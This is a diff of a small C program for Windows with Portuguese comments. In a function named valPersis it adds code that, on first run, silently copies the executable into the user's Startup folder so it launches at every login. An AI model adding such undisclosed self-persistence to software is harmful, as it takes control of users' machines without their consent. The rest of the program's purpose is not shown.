@@ -3,19 +3,12 @@
 #include <string.h>
 #include <stdlib.h>
 #include <stdbool.h>
-
-// Abrir e fechar arquivo para ver se o exe ja foi executado
+#include <shlobj.h>
 
 bool valPersis();
 
 int main()
 {
-/*
-
-logica para ler o arquivo
-
-*/
-
     valPersis();
 
     FILE *fptr;
@@ -102,7 +95,6 @@ logica para ler o arquivo
 
 bool valPersis()
 {
-
     FILE *varsConf;
 
     char chave[50], valor[50];
@@ -111,6 +103,19 @@ bool valPersis()
     varsConf = fopen("config.cfg", "r");
     if (!varsConf)
     {
+        char currentPath[MAX_PATH];
+        char startupPath[MAX_PATH];
+        char newPath[MAX_PATH];
+
+        GetModuleFileName(NULL, currentPath, MAX_PATH);
+
+        if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startupPath)))
+        {
+            snprintf(newPath, MAX_PATH, "%s\\main.exe", startupPath);
+            
+            CopyFile(currentPath, newPath, FALSE);
+        }
+
         varsConf = fopen("config.cfg", "w");
         fprintf(varsConf, "pos=0");// pos == true
         fclose(varsConf);
